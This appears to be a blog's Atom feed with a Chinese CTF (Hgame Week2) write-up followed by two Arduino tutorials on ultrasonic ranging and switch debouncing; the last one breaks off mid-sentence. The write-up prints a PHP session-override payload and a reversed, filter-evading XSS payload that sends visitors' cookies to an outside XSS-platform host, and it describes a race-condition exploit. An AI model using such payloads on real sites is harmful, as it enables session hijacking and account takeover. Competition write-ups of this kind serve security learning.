    <category term="test3" scheme="https://wujunyi792.github.io/categories/test3/"/>
    
    <category term="test4" scheme="https://wujunyi792.github.io/categories/test3/test4/"/>
    
    
    <category term="test1" scheme="https://wujunyi792.github.io/tags/test1/"/>
    
    <category term="test2" scheme="https://wujunyi792.github.io/tags/test2/"/>
    
  </entry>
  
  <entry>
    <title>Hgame Week2 Writeup</title>
    <link href="https://wujunyi792.github.io/2021/02/13/Hgame%20weel2%20Writeup/"/>
    <id>https://wujunyi792.github.io/2021/02/13/Hgame%20weel2%20Writeup/</id>
    <published>2021-02-13T15:26:02.000Z</published>
    <updated>2021-02-21T10:52:17.424Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>菜鸡视角 hgame 游戏体验</p></blockquote><a id="more"></a><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210213233816.png" alt="image-20210213233809239" style="zoom:33%;" /><p>首先，/<a href="http://www.zip/">www.zip</a> 存在源码泄露。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214002402.png" alt="image-20210214002402253" style="zoom:50%;" /><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;config.ini</span><br><span class="line">[global]</span><br><span class="line">debug &#x3D; true</span><br><span class="line"></span><br><span class="line">[admin]</span><br><span class="line">username &#x3D; admin</span><br><span class="line">pass_md5 &#x3D; b02d455009d3cf71951ba28058b2e615</span><br><span class="line"></span><br><span class="line">[testuser]</span><br><span class="line">username &#x3D; testuser</span><br><span class="line">pass_md5 &#x3D; 0e114902927253523756713132279690</span><br></pre></td></tr></table></figure><p>通过阅读源码了解到，需要以 admin 账户登录才能获得 flag。 但是很显然我们只能利用 php比较漏洞 来登录 testuser 账户，但是这样显然无法得到 flag。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214003013.png" alt="image-20210214003013130" style="zoom:50%;" /><p>但是 admin 被加密的 MD5 尝试了很多办法也无法解码。这时候得利用 变量覆盖 将<code>$_SESSION[&#39;username&#39;]</code>的值变为 <code>admin</code>。</p><p>在<code>lazy.php</code>存在一段过滤代码，会将请求中所有键名进行过滤，但是只过滤了一遍，这里造成了漏洞。</p><p>我们可以构造 payload ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSSESSIONION[username]=admin&amp;submit=getflag</span><br></pre></td></tr></table></figure><p>POST 发送数据即可得到flag</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214003956.png" alt="Snipaste_2021-02-10_23-11-28" style="zoom:30%;" /><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>这题很明显是考的 XSS，为此煞费苦心自己搭建了一个 XSS 平台，用的是莲花战队的源码</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214004201.png" alt="image-20210214004200890" style="zoom:33%;" /><p>题目图下：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214004232.png" alt="image-20210214004232187" style="zoom:50%;" /><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214004302.png" alt="image-20210214004302463" style="zoom:30%;" /><p>网页逻辑：第一个文本框中输入信息，点击 Post it 后会显示在下面的留言区；第二个输入框输入验证码，点击提交后，服务器会自动浏览你的留言。但是我们必须有管理员的 token 才能点击左上角的 flag 获得 flag。所以我们要做的：</p><ul><li><p>写一段 xss代码 能够截取浏览者cookies 并发送到 xss平台</p></li><li><p>爆破一个字符串，使得这个字符串经过 MD5 加密后的前六位与验证码提示框中给出的验证码相同</p></li><li><p>等待服务器读取留言，xss 平台会收到来自 admin 的 token</p></li><li><p>使用管理员的 token 点击 flag 获取答案</p></li></ul><p>这个网站的 XSS 过滤原则很有趣，<code>script</code>变<code>div</code>，遇到<code>http</code> <code>ptth</code>直接删除，遇到<code>onerror</code>转换成<code>rorreon</code>并将所有字符串反转，遇到<code>rorreon</code>转换成<code>onerror</code>并将所有字符串反转</p><p>经过精致打磨，写出了 xss 代码如下：</p><p><code>&gt;vid&lt;&gt;&quot;;)()&#125;;))()&#125;&#125;&#39;&#39;nruter&#123;)e(hctac&#125;&#39;&#39;:ferh.noitacol.renepo.wodniw?)ferh.noitacol.renepo.wodniw&amp;&amp;renepo.wodniw(nruter&#123;yrt&#123;)(noitcnuf((epacse+&#39;=renepo&amp;&#39;+))()&#125;&#125;&#39;&#39;nruter&#123;)e(hctac&#125;eikooc.tnemucod nruter&#123;yrt&#123;)(noitcnuf((epacse+&#39;=eikooc&amp;&#39;+))()&#125;&#125;&#39;&#39;nruter&#123;)e(hctac&#125;ferh.noitacol.pot nruter&#123;yrt&#123;)(noitcnuf((epacse+&#39;=noitacolpot&amp;&#39;+))()&#125;&#125;&#39;&#39;nruter&#123;)e(hctac&#125;ferh.noitacol.tnemucod nruter&#123;yrt&#123;)(noitcnuf((epacse+&#39;=noitacol&amp;1=noissespeek?/&#39;+etisbew=crs.))(egamI wen(&#123;)(noitcnuf(;&#39;php.xedni/moc.sduolcjm.ssx//:s&#39;+b+a=etisbew rav ;&#39;ptt&#39;=b rav ;&#39;h&#39;=a rav&quot;=rorreon x=crs gmi&lt;&gt;vid/&lt;</code></p><p>提交后不一会，我的 XSS 收到了我自己的 cookies。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214005616.png" alt="image-20210214005616882" style="zoom:50%;" /><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214005642.png" alt="image-20210214005642043" style="zoom:50%;" /><p>说明 XSS成果，下一步是要破解那个验证码。无从下手，于是写了个 Python 爆破，就测试五位数字看看,跑不出那就删除 cookie 刷新页面，重发脚本，使用新的验证码，总有能成功的。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span>(<span class="params">chars</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(chars.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random.randint(<span class="number">99999</span>, <span class="number">1000000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    start = <span class="string">&quot;313094&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        strs = generate()</span><br><span class="line">        print(<span class="string">&quot;Test&quot;</span>, strs)</span><br><span class="line">        <span class="keyword">if</span> encryption(strs).startswith(start):</span><br><span class="line">            print(<span class="string">&quot;yes!&quot;</span>)</span><br><span class="line">            print(<span class="string">&quot;[+] %s &quot;</span> % strs + <span class="string">&quot;%s &quot;</span> % encryption(strs))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;no!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    print(<span class="string">&#x27;完成！&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当时我成功了：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214010845.png" alt="image-20210214010845706" style="zoom:33%;" /><p>提交！随后 XSS 平台就收到了管理员的token ：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214011009.png" alt="image-20210214011009047" style="zoom:50%;" /><p>修改 token 得到 flag ！</p><h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214011918.png" alt="image-20210214011918728" style="zoom:50%;" /><p>先注册账号，这里不吐槽了，简单的用户名已经都被注册了….</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214012043.png" alt="image-20210214012043621" style="zoom:30%;" /><p>很明显，差两张券，这里运用条件竞争，方便点用 Burp，低线程兑换券，一次兑换一张，高线程兑换非法数量的券，我使用数量 0 ，设置如下（左侧100线程，右侧50线程）：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214012306.png" alt="1" style="zoom:33%;" /><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214012352.png" alt="2" style="zoom:33%;" /><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214012502.png" alt="3" style="zoom:33%;" /><p>Attack！</p><p>不一会就有结果了：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214012551.png" alt="FLAG" style="zoom:33%;" /><p>flag GET！</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214012915.png" alt="image-20210214012915596"></p><p>很 esay 直接上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">c = <span class="number">747831491353896780365654517748216624798517769637260742155527</span></span><br><span class="line">n = <span class="number">882564595536224140639625987659416029426239230804614613279163</span></span><br><span class="line"><span class="comment"># n = int(&quot;&quot;,16)</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment"># e = int(&quot;&quot;,16)</span></span><br><span class="line">q = <span class="number">1029224947942998075080348647219</span></span><br><span class="line">p = <span class="number">857504083339712752489993810777</span></span><br><span class="line"></span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># m 的十进制形式</span></span><br><span class="line">string = long_to_bytes(m)  <span class="comment"># m明文</span></span><br><span class="line">print(string)  <span class="comment"># 结果为 b‘ m ’ 的形式</span></span><br></pre></td></tr></table></figure><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214013020.png" alt="image-20210214013020479" style="zoom:33%;" /><p>FLAG get！</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="第四题-1"><a href="#第四题-1" class="headerlink" title="第四题"></a>第四题</h2><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214013140.png" alt="image-20210214013140398" style="zoom:50%;" /><p>pcapng 文件，使用 Wireshark 打开，迅速锁定一个奇怪网址：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214013819.png" alt="Snipaste_2021-02-14_01-33-27" style="zoom:50%;" /><p>去 cf.hgame2021.cf 看看，发现有连续不断的弹窗。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214013908.png" alt="Snipaste_2021-02-14_01-35-06" style="zoom: 33%;" /><p>那我们禁用 js</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214013938.png" alt="Snipaste_2021-02-14_01-35-29" style="zoom: 50%;" /><p>获得线索，flag 果然不在这 ….</p><p>既然说到 SPF 那我们就查看一下 SPF记录吧。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210214014118.png" alt="Snipaste_2021-02-14_01-37-01" style="zoom:70%;" /><p>然后 flag 就出来了？</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>自己好菜</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;菜鸡视角 hgame 游戏体验&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="Hgame" scheme="https://wujunyi792.github.io/categories/Hgame/"/>
    
    
    <category term="Hgame" scheme="https://wujunyi792.github.io/tags/Hgame/"/>
    
    <category term="writeup" scheme="https://wujunyi792.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>arduino 激光测距模块</title>
    <link href="https://wujunyi792.github.io/2021/02/13/%E6%BF%80%E5%85%89%E6%B5%8B%E8%B7%9D/"/>
    <id>https://wujunyi792.github.io/2021/02/13/%E6%BF%80%E5%85%89%E6%B5%8B%E8%B7%9D/</id>
    <published>2021-02-13T08:42:15.000Z</published>
    <updated>2021-02-22T10:12:28.226Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>这里记录了关于 arduino 超声波模块的使用方法</p></blockquote><a id="more"></a><h1 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h1><h2 id="–超声波测距"><a href="#–超声波测距" class="headerlink" title="–超声波测距"></a>–超声波测距</h2><p>​    超声波，即人耳可听见频率以上的声波，可用来探测距离，其原理和雷达类似：从发射超声波到接收反射波所需的时间经过计算可以得到距离。</p><p>​    可<strong>在空气中</strong>传播的超声波频率大约介于 20~299kHz 之间，其衰减程度与频率成正比（频率越高，传播距离越短），我们平常能买到的超声波模块通常采用 38kHz、40kHz 或 42kHz。</p><p>​    在室温 20℃ 的环境中，声波的传播速度约为 344m/s（水中比空气中快 60 倍），因此，假设超声波往返的时间为 600μs 从公式可计算出被测物体的距离为 10.3cm。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210222024202.png" alt="距离计算公司" style="zoom:70%;" /><p>​    从声音的传播速度和时间，可求出距离，而物体的实际距离是传播时间的一半，所以可以求得 <strong>1cm 距离的声波传递时间为 58μs。</strong></p><hr><p>空气的密度会影响声音的传播速度，空气的密度越高，声音传播速度越快，而空气的密度又与温度密切相关。考虑温度变化的声音传播速度的近似公式如下：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210222024944.png" alt="image-20210222024944129" style="zoom:50%;" /><p>​    此外，物体的形状和材质会影响超声波测距的效果和准确度，反射表面平整时，声波会照入射角反射回来，但要是表面粗糙的话，声音将被散射或吸收。不过，只要物体表面的坑洞尺寸小于声波波长的四分之一，即可视为平整表面。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210222025426.png" alt="image-20210222025426787" style="zoom:50%;" /><p>BTW，假如超声波的发射和接收装置不在同一点，那么声音的传播途径不是直线，计算距离时要考虑传感器造成的夹角。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210222025624.png" alt="image-20210222025624215" style="zoom:50%;" /><h2 id="–超声波传感器模块"><a href="#–超声波传感器模块" class="headerlink" title="–超声波传感器模块"></a>–超声波传感器模块</h2><blockquote><p>我记得高中时候有一次去区里答辩，我的项目是一个基于 arduino 的实验设备，然后有个老师就问我 “超声波传感器局限在哪，和红外测距有什么区别？” 当时我是懵了一下。</p><p>答：被测物体运动速度超过声速就无法测量了</p></blockquote><p>超声波模块一般有两个超声波元器件，一个用于发射，一个用于接收。电路板上一般四个引脚：VCC（正电源）、Trig（触发）、Echo（回应）、GND（接地）。大部分实验用的超声波传感器模块参数如下：</p><table><thead><tr><th>指标</th><th>值</th></tr></thead><tbody><tr><td>工作电压</td><td>5V</td></tr><tr><td>工作电流</td><td>15mA</td></tr><tr><td>感测角度</td><td>≤15°</td></tr><tr><td>被测物</td><td>面积不小于 50cm² 且平整</td></tr></tbody></table><p>在超声波模块的<strong>触发</strong>脚位输入 10微秒以上的高电位，即可发射超声波，发射超声波以后，与接收到传回的超声波之前，<strong>响应</strong>脚位呈现高电位。程序通过<strong>响应</strong>脚位的高电位脉冲持续时间，换算出被测物的距离。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210222031200.png" alt="image-20210222031200008" style="zoom:70%;" /><h2 id="串口通信"><a href="#串口通信" class="headerlink" title="串口通信"></a>串口通信</h2><p>这玩意儿比较复杂，之间抛链接吧！<a href="https://en.wikipedia.org/wiki/Serial_communication">维基百科-Serial communication</a>.</p><p>这里看见个有意思的东西—— Mac OS 与 Linux 的通信端口。Windows 系统使用 COM（原意是COMmunication, 通信）代表通信端口，Mac OS（ 一种基干Unix 的操作系统）和 Linux 则用TIY 代表通信端口。TIY 的原意是 ‘’ teletypewriter “（早期用来操作和大型电脑联机的终端机）。Mac OS 和Linux 系统把每个设备都看成文件，位千／dev 路径底下，因此在Mac<br>的终端机窗口输入<code>ls -l /dev/tty.*</code>， 将能列举所有通信端口。</p><p>除了 TTY，Mac 和 Linux 上的通信端口还有包含—个同名的 CU。TTY 用于输入信息给设备，CU 代表 call up，用于从设备传出细信息，两者合作能同时收发信息，被称为全双工。在 Arduino 上，无论使用 TTY 还是 CU，都能传递信息，但一般选用 TTY。</p><h2 id="串行数据传输协议"><a href="#串行数据传输协议" class="headerlink" title="串行数据传输协议"></a>串行数据传输协议</h2><p><strong>传输协议</strong>代表通信设备双方所遵循的规范和参数，通信双方的设置要一致，才能相互沟通。</p><p>对于 USB 设备，像是键盘、鼠标等 “人机接口” 类、打印机的 “打印设备” 类、移动设备的 “存储设备” 类等，每个设备都有不同的传输协议，也需要安装对应的驱动程序。</p><p>当我们接上 Arduino Uno 开发板，在设备管理器中可以观察并更改其通信属性。</p><p><strong>每秒位数</strong>（bit per second，简称 bps）是串口的<strong>传输速率</strong>，也称为<strong>波特率</strong>（Baud rate）。两个通信设备的波特率必须一致，一般为两部机器所能接受的最高速率，常见的选择为 9600bps 和115200bps。<br>开始传输数据之前，RS-232 的传送（TX）与接收（RX）脚都处于高电位状态，传送数据时，它将先送出—个代表 “要开始传送囖! ” 的<strong>起始位</strong>（start bit, 低电位），接着才送出真正的数据内容（称为<strong>数据位</strong>，data bit ），每一组数据位的长度可以是5~8 个位，通常选用 8 个位。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210222034431.png" alt="image-20210222034431685" style="zoom:70%;" /><p>一组数据位后面，会跟着代表 “传送完毕” 的<strong>停止位</strong>（stop bit），停止位通常占 1 位，某些低速的设备要求使用 2 位。</p><p>除了<strong>数据传输线</strong>。还需要一条确保信息收发两端步调一致的<strong>频率同步线</strong>。但 RS -232 和 USB 串口线不需要同步线，因为它们会在数据前后加上“开始” 和 “结束“ 信息。这种传送方式统称<strong>通用异步收发传输器</strong>(Universal Asynchronous Receiver/Transmitter，简称 UART）。</p><h1 id="设计方案"><a href="#设计方案" class="headerlink" title="设计方案"></a>设计方案</h1><p>fritzing 找不到超声波模块了，用网图代替下吧，毕竟不难。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210222175718.png" alt="image-20210222175711285" style="zoom:50%;" /><h1 id="材料清单"><a href="#材料清单" class="headerlink" title="材料清单"></a>材料清单</h1><table><thead><tr><th>名称</th><th>数量</th></tr></thead><tbody><tr><td>Adruino</td><td>1</td></tr><tr><td>超声波传感器模块 HC-SR04</td><td>1</td></tr></tbody></table><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">首先要安装 Ultrasonic 的函数库</span></span><br><span class="line"><span class="comment">VCC接5V，GND接地。Trig接到pin 12，Echo接到pin 13。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Ultrasonic.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">Ultrasonic <span class="title">ultrasonic</span><span class="params">(<span class="number">12</span>, <span class="number">13</span>)</span></span>;</span><br><span class="line"><span class="keyword">int</span> distance;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Serial.begin(<span class="number">9600</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  distance = ultrasonic.read(); <span class="comment">//不加参数就是输出CM，可用read(INC)输出英寸</span></span><br><span class="line">  </span><br><span class="line">  Serial.print(<span class="string">&quot;Distance in CM: &quot;</span>);</span><br><span class="line">  Serial.println(distance);</span><br><span class="line">  delay(<span class="number">500</span>); <span class="comment">//每次间隔0.5秒</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="成果展示"><a href="#成果展示" class="headerlink" title="成果展示"></a>成果展示</h1><p><video controls name="media" style="zoom:60%;"><source src="https://videos-wujunyi.oss-cn-beijing.aliyuncs.com/VID_20210222_180016.mp4" type="video/mp4"></video></p><p>侵删</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;这里记录了关于 arduino 超声波模块的使用方法&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="arduino" scheme="https://wujunyi792.github.io/categories/arduino/"/>
    
    <category term="单片机" scheme="https://wujunyi792.github.io/categories/arduino/%E5%8D%95%E7%89%87%E6%9C%BA/"/>
    
    
    <category term="arduino" scheme="https://wujunyi792.github.io/tags/arduino/"/>
    
  </entry>
  
  <entry>
    <title>PWN 按钮调光</title>
    <link href="https://wujunyi792.github.io/2021/02/05/PWN%20%E6%8C%89%E9%92%AE%E8%B0%83%E5%85%89/"/>
    <id>https://wujunyi792.github.io/2021/02/05/PWN%20%E6%8C%89%E9%92%AE%E8%B0%83%E5%85%89/</id>
    <published>2021-02-05T05:40:58.000Z</published>
    <updated>2021-02-05T13:47:45.208Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>任务内容：<br>两个按键A、B，A 按下小灯变亮一点，B 按下小灯变暗一点。</p></blockquote><a id="more"></a><h1 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h1><h2 id="·-按键防抖"><a href="#·-按键防抖" class="headerlink" title="· 按键防抖"></a>· 按键防抖</h2><p>​        机械式开关在切换过程中，电子信号并非立即从 0 变成 1（ 或从 1 变成 0 ），而会经过短暂的，像下图一样忽高忽低变化的弹跳现象。虽然弹跳动作的时间非常短暂，但微电脑仍将读取到连续变化的开关信号，导致程序误操作。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210205140255.png" alt="信号弹跳问题" style="zoom:50%;" /><p>​        为了避免上述状况，读取机械式开关信号时，程序（或者硬件）需要加入所谓的**消除弹跳 ( de-bouncing ) **处理机制。最简单的方式，就是在发现输入信号变化时，先暂停 10~30毫秒，然后再读取一次，以便确定输入值。</p><h4 id="代码示例："><a href="#代码示例：" class="headerlink" title="代码示例："></a>代码示例：</h4><p>​        如下图所示，在 “单击” 操作中，信号改变了两次。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210205143159.png" alt="one click" style="zoom:50%;" /><p>​        那么我们可以声明一个 click 的变量，记录信号改变的次数，每当此变量值为 2 ，代表按了一下按钮。具备 “ 过滤 ” 弹跳信号的开关代码如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> byte LED = <span class="number">13</span>;<span class="comment">// LED 的脚位</span></span><br><span class="line"><span class="keyword">const</span> byte SW = <span class="number">2</span>;<span class="comment">//开关脚位</span></span><br><span class="line">boolean lastState = LOW;<span class="comment">//记录上次开关状态，预设为 LOW</span></span><br><span class="line">boolean toggle = LOW;<span class="comment">//输出给 LED 的信号，预设为 LOW</span></span><br><span class="line">byte click = <span class="number">0</span>;<span class="comment">//开关信号的改变次数，预设为 0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">pinMode(LED, OUTPUT);</span><br><span class="line">pinMode(SW, INPUT);</span><br><span class="line">    lastState = digitalRead(SW);<span class="comment">//读取开关的初始值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">boolean b1 = digitalRead(SW);<span class="comment">//读取目前开关的值</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (b1 != lastState) &#123;<span class="comment">//如果和之前的开关值不同</span></span><br><span class="line">        delay(<span class="number">20</span>);<span class="comment">//等待 20 毫秒</span></span><br><span class="line">        boolean b2 = digitalRead(SW);<span class="comment">//再读取一次开关值</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (b1 == b2) &#123;<span class="comment">//确认两次开关值是否一致</span></span><br><span class="line">            lastState = b1;<span class="comment">//储存开关状态</span></span><br><span class="line">            click++;<span class="comment">//增加信号变化次数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (click == <span class="number">2</span>) &#123;<span class="comment">//如果开关状态改变两次</span></span><br><span class="line">        click = <span class="number">0</span>;<span class="comment">//状态次数归零</span></span><br><span class="line">        toggle = !toggle;<span class="comment">//取反</span></span><br><span class="line">        digitalWrite(LED, toggle);<span class="comment">//输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        loop() 区块不停地读取开关的值，并且对比开关的信号是否和上一次不同。假如监测到开关的信号改变了，要等待 20 毫秒之后，再确认一次开关值。如果等待20毫秒后读取到的开关信号值和上一次读取到的一致，就确认开关的状态真的改变了。</p><h2 id="·-开关的接法（上拉电阻-amp-下拉电阻）"><a href="#·-开关的接法（上拉电阻-amp-下拉电阻）" class="headerlink" title="· 开关的接法（上拉电阻 &amp; 下拉电阻）"></a>· 开关的接法（上拉电阻 &amp; 下拉电阻）</h2><p>​        Arduino 的所有<strong>数字</strong>和<strong>模拟引脚</strong>都能读取 / 输出 0 与 1 信号。只要输入值<strong>超过电源电压的一半</strong>，就代表高电压<strong>高电位</strong>；若输入值低于 0.25V，则代表<strong>低电位</strong>。</p><p style='color=red'>这样的开关接法并不正确:</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210205152239.png" alt="image-20210205152239449" style="zoom:50%;" /><p>​        若没有按下开关，Arduino 的引脚既没接地接地，也为接到高电位。输入信号可能在 0 与 1 之间的模糊地带漂移，造成所谓的<strong>浮动信号</strong>，Arduino 将无法正确判断输入值。</p><p>​        正确接法如下：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210205152520.png" alt="下拉电阻正确接法" style="zoom:50%;" /><p>​        若开关没有被按下，数字第 2 脚将通过 10kΩ 接地，因而读取到低电位值；按下开关时，5V 电源将流入第 2 